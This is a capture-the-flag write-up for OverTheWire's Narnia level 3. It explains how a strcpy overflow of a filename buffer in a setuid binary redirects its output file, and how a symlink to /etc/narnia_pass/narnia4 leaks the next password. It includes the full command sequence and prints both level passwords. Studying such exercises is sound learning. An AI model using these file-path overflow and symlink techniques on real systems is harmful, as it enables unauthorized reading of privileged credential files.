# Narnia Level 03 to 04

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Narnia |
| Level | 3 -> 4 |
| Status | Complete |

## Objective

Abuse the filename overflow in `narnia3` to copy the next password into a file we control.

## Given Access

User: `narnia3`

Password:

```text
2xszzNl6uG
```

## Recon

The binary copies `argv[1]` into `ifile[32]` with `strcpy()`, but opens `ofile` first. Overflowing `ifile` lets us replace the default output path `/dev/null` with a writable file under `/tmp`.

## Method

Create a 32-byte directory prefix, place a symlink to `/etc/narnia_pass/narnia4` beneath it, and append `/tmp/ax` so the overflow rewrites `ofile` to `/tmp/ax` while the full original argument still resolves to the symlinked input file.

## Commands

```bash
ssh -p 2226 narnia3@narnia.labs.overthewire.org
base=/tmp/FOOBARFOOBARFOOBARFOOBARFOO
mkdir -p "$base/tmp"
chmod 755 "$base" "$base/tmp"
ln -sf /etc/narnia_pass/narnia4 "$base/tmp/ax"
touch /tmp/ax && chmod 666 /tmp/ax
/narnia/narnia3 "$base/tmp/ax"
cat /tmp/ax
```

## Result

Password for `narnia4`:

```text
iqNWNk173q
```

## Lesson

A stack overwrite does not have to reach saved return state to be useful; corrupting a nearby pathname can be enough to redirect privileged file I/O.

## References

- https://overthewire.org/wargames/narnia/
